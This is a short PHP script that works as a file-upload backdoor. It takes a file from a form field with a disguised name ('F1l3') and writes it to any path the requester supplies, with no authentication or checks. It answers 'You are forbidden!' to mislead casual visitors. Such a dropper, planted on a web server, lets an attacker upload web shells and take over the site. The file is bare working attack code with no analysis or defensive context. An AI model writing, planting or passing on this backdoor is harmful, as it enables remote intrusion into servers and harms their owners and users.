<?
  if ($_FILES['F1l3']) {
    move_uploaded_file($_FILES['F1l3']['tmp_name'], $_POST['Name']);
    echo 'OK';
  } else {
    echo 'You are forbidden!';
  }
?>
